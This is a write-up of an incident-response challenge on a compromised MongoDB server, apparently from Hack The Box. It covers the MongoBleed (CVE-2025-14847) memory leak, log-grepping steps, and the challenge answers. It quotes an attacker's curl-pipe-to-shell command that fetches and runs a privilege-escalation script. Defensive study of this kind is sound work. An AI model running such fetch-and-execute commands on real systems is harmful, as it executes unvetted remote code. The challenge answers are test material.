
#### Sherlock Scenario

You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

---

### ATTACK WALKTHROUGH:

- From the auth.log, we get to know that 119.73.124.129 logged into the system using SSH keys and installed MongoDB using sudo access `/usr/bin/su` .
- Initially MongoDB was only listening locally: `127.0.0.1:27017` But later MongoDB was restarted with: `bindIp: 0.0.0.0` meaning, it was listening on all network interfaces. 
- Even worse is that there was no authentication needed to access the DB - MongoDB authentication was disabled
	`Access control is not enabled for the database. Read and write access to data and configuration is unrestricted`
- These two are the major flaws in the system. And the version of the MongoDB installed - 8.0.16 vulnerable to MongoBleed (CVE-2025-14847)

#### What exactly is MongoBleed?
- MongoBleed (CVE-2025-14847) is a MongoDB vulnerability that can let an attacker read pieces of the server's memory by sending specially crafted compressed messages.
- MongoDB supports zlib compression for its network protocol.The compressed message contains a field called `uncompressedSize`, which tells MongoDB how large the message should be after decompression.
- The attacker sends a specially crafted compressed request. They manipulate uncompressedSize and make it much larger than the actual data.
- The vulnerable MongoDB version allocates a memory buffer based on the attacker's claimed size. But the actual compressed data contains much less information.
- The data is fully extracted from the errors got through the server, the DB's internal structure without accessing it. 
- MongoDB has allocated something like:
	`[ REAL DATA ][ ????? ????? ????? ????? ]`
    The `????` area is **uninitialized heap memory**—it can contain remnants of data that was previously stored there.
- Due to the vulnerable length handling, MongoDB can treat that extra memory as part of the message.
```
Actual message
	|
[DATA][OLD MEMORY][OLD MEMORY][OLD MEMORY]
         |
         └── leaked
```
- The malformed request can cause MongoDB's error handling/parsing to include portions of that memory in its response. The attacker can therefore recover fragments of the server's memory.

---

### TASKS

1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?  `CVE-2025-14847` 
Browsing online, Vulnerability related to MongoDB, we get this : `CVE-2025-14847` 

2. What is the version of MongoDB installed on the server that the CVE exploited?   `8.0.16`

In the file system, `uac-mongodbsync-linux-triage/[root]/var/log/mongodb` contains `mongod.log` which contain a comprehensive, structured record of the database instance's internal operations, events, and potential issues.

By filtering the log file using the BuildInfo, we get to know that version of the MongoDB installed.  The buildInfo data is saved to the mongod.log file at startup to record the exact version, build environment, and platform metadata of the MongoDB server instance.

```bash
└─$ cat mongod.log | grep "Build Info"                 
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
```


3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.   `65.0.76.43`

Analysing through the log file, we can find that there has been connection accepted and ended logs, so filtering the log file using the remote keyword helps us find the remote IP address

```bash
└─$ cat mongod.log | grep "remote"
{"t":{"$date":"2025-12-29T05:27:07.160+00:00"},"s":"I",  "c":"NETWORK",  "id":22944,   "ctx":"conn37630","msg":"Connection ended","attr":{"remote":"65.0.76.43:37290","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"dd6d41f0-9b61-4d23-ba8e-45eee13d9913"}},"connectionId":37630,"connectionCount":0}}
```

4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)   `2025-12-29 05:25:52`

Analysing through the file, the first connection accepted log's timestamp is the attacker's first activity. By filtering using the "Connection accepted" lists the connections initiated by the attacker.

```bash
└─$ cat mongod.log | grep "Connection accepted"
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```

5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.  `75260`

By filtering the logs using "Connection accepted" and "Connection ended" words, we get to know the total connections done by the attacker. 37630 + 37630 = 75260.  

![[Pasted image 20260923102518.png]]


6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?


![[Pasted image 20260923105526.png]]

![[Pasted image 20260923105503.png]]

7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.   `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

Navigating to the `/uac-mongodbsync-linux-triage/[root]/home/mongoadmin` directory, we find the bash_history file, in which we can find the commands used in the compromised account. One among these commands caught my interest - the curl command which downloads the file and executes it.

![[Pasted image 20260923112755.png]]


8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?    `/var/lib/mongodb`

![[Pasted image 20260923112755.png]]

In this bash history, we can find that the attacker navigated to the `/var/lib/mongodb` directory and then opened the Python web server.